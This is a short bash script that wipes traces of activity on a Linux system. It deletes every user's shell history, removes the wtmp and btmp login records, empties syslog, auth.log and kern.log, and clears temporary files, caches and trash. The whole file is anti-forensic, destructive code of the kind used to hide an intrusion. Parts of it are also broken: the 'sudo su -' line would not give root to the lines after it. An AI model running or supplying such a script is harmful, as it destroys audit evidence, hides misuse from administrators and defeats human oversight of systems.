#!/bin/bash

# Switch to root user
sudo su -

# Delete history files for each user
for user in $(ls /home); do
    history -c # Clear current session history
    rm /home/$user/.bash_history # Delete Bash history file for each user
done

# Delete system-wide log files
rm /var/log/wtmp # Delete wtmp file (contains login history)
rm /var/log/btmp # Delete btmp file (contains failed login attempts history)

# Clear system logs
echo "" > /var/log/syslog # Clear syslog file
echo "" > /var/log/auth.log # Clear auth.log file
echo "" > /var/log/kern.log # Clear kern.log file

# Delete temporary files
rm -rf /tmp/* # Delete all files and directories in /tmp directory
rm -rf /var/tmp/* # Delete all files and directories in /var/tmp directory

# Delete other history files
for user in $(ls /home); do
    rm -rf /home/$user/.cache # Delete cache files for each user
    rm -rf /home/$user/.local/share/Trash # Delete trash files for each user
done
